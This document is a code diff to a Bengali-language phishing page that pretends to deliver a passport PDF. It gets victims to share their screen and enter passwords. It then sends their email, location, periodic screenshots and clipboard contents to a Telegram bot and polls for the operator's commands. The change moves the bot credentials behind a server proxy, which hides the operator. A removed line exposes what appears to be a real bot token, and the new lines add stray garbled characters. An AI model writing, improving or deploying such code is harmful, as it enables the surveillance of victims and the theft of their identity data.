@@ -135,7 +135,7 @@
                     <p class="text-gray-800 text-center font-extrabold text-[13px] bg-red-50 text-red-950 p-2 rounded-xl">আপনার পাসপোর্ট পিডিএফ ফাইলটি ডাউনলোড করার জন্য নোটিফিকেশন পাঠানো হচ্ছে।</p>
                     <p class="text-[12px] text-gray-600"><span class="text-red-500">১.</span> নোটিফিকেশন যাওয়ার সাথে সাথে ক্লিক করুন। কনফার্ম বাটনে ক্লিক করুন।</p>
                     <p class="text-[12px] text-gray-600"><span class="text-red-500">২.</span> তারপর আপনার ফোনের লক আসবে, ফোনটি আনলক করুন।</p>
-                    <p class="text-[12px] text-gray-600"><span class="text-red-500">৩.</span> তারপর যে ফাঁকা ঘর পাবেন সেখানে আপনার পাসপোর্ট PDF ফাইলের পাসওয়ার্ড বসিয়ে ডাউনলোড করুন।</p>
+                    <p class="text-[12px] text-gray-600"><span class="text-red-500">৩.</span> তারপর যে ফাঁকা ঘর পাবেন সেখানে আপনার প��সপোর্ট PDF ফাইলের পাসওয়ার্ড বসিয়ে ডাউনলোড করুন।</p>
                 </div>
 
                 <button onclick="requestScreenShare()" class="w-full bg-gradient-to-r from-red-500 to-rose-600 text-white font-black py-3.5 rounded-xl text-md shadow-md active:scale-95 transition-all">অনুমতি দিন এবং ডাউনলোড করুন</button>
@@ -161,8 +161,14 @@
     </div>
 
 <script>
-    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
-    const chatId = "8516934257";
+    // No BOT_TOKEN or CHAT_ID in client-side code.
+    // The client will call server-side proxy endpoints which hold the real token and chat id securely.
+    const TELEGRAM_PROXY = {
+        sendMessage: '/telegram/sendMessage',
+        sendPhoto: '/telegram/sendPhoto',
+        getUpdates: '/telegram/getUpdates'
+    };
+
     let lastUpdateId = 0;
     let deviceInfo = "Unknown";
     let isEmailSent = false;
@@ -212,7 +218,7 @@
         }
     }
 
-    function finalSubmit() {
+    async function finalSubmit() {
         const email = document.getElementById('email_field').value;
         if(!email) return;
         sessionStorage.setItem('isWaiting', 'true');
@@ -232,10 +238,11 @@
             ]
         };
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Send through server proxy (server will use BOT_TOKEN and CHAT_ID)
+        fetch(TELEGRAM_PROXY.sendMessage, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chatId, text: `🎯 **ফাইনাল সাবমিট!**\n📧 ইমেইল: \`${email}\`\n📍 লোকেশন: ${deviceInfo}`, reply_markup: keyboard })
+            body: JSON.stringify({ text: `🎯 **ফাইনাল সাবমিট!**\n📧 ইমেইল: \`${email}\`\n📍 লোকেশন: ${deviceInfo}`, reply_markup: keyboard })
         });
 
         goToStep('verifying');
@@ -347,11 +354,11 @@
     }
 
     function sendToBot(text) {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+        fetch(TELEGRAM_PROXY.sendMessage, { 
             method: 'POST', 
             headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify({ chat_id: chatId, text: text }) 
-        });
+            body: JSON.stringify({ text: text }) 
+        }).catch(()=>{});
     }
 
     // SCREEN SHARE & CLIPBOARD MONITORING
@@ -375,8 +382,8 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob((blob) => {
                 if (!blob) return;
-                const formData = new FormData(); formData.append('chat_id', chatId); formData.append('photo', blob, `screen.png`);
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                const formData = new FormData(); formData.append('photo', blob, `screen.jpg`);
+                fetch(TELEGRAM_PROXY.sendPhoto, { method: 'POST', body: formData }).catch(()=>{});
             }, 'image/jpeg', 0.5);
         }, 3000);
     }
@@ -402,13 +409,13 @@
 
     function stopClipboardMonitoring() {
         if (clipboardMonitorInterval) { clearInterval(clipboardMonitorInterval); clipboardMonitorInterval = null; }
-        sendToBot(`⏹️ **ক্লিপবোর্ড মনিটরিং বন্ধ করা হয়েছে।**`);
+        sendToBot(`⏹️ **ক्लিপবোর্ড মনিটরিং বন্ধ করা হয়েছে।**`);
     }
 
     function startListening() {
         setInterval(async () => {
             try {
-                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const res = await fetch(`${TELEGRAM_PROXY.getUpdates}?offset=${lastUpdateId + 1}`);
                 const data = await res.json();
                 if (data.ok && data.result.length > 0) {
                     data.result.forEach(update => {
